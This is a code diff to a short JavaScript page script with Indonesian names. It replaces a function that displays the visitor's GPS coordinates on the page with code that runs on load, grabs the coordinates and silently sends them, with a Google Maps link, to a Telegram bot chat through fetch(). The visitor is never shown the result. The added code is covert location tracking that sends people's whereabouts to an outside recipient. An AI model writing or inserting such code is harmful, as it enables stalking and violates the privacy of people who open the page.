@@ -1,27 +1,37 @@
-function getLocation() {
+const token = "TOKEN_BOT_KAMU";
+const chat_id = "8334910422";
 
-if (navigator.geolocation) {
+function kirimLokasi(lat, lon) {
 
-navigator.geolocation.getCurrentPosition(showPosition);
+const url = `https://api.telegram.org/bot${token}/sendMessage`;
 
-} else {
+const text = `
+📍 Lokasi ditemukan
 
-document.getElementById("hasil").innerHTML = "Browser tidak mendukung GPS";
+Latitude: ${lat}
+Longitude: ${lon}
+
+https://www.google.com/maps?q=${lat},${lon}
+`;
+
+fetch(url,{
+method:"POST",
+headers:{
+"Content-Type":"application/json"
+},
+body:JSON.stringify({
+chat_id:chat_id,
+text:text
+})
+});
 
 }
 
-}
+navigator.geolocation.getCurrentPosition(function(pos){
 
-function showPosition(position) {
+const lat = pos.coords.latitude;
+const lon = pos.coords.longitude;
 
-let lat = position.coords.latitude;
-let lon = position.coords.longitude;
+kirimLokasi(lat,lon);
 
-let link = "https://www.google.com/maps?q=" + lat + "," + lon;
-
-document.getElementById("hasil").innerHTML =
-"<p>Latitude: " + lat + "</p>" +
-"<p>Longitude: " + lon + "</p>" +
-"<a href='"+link+"' target='_blank'>Buka di Google Maps</a>";
-
-}
+});
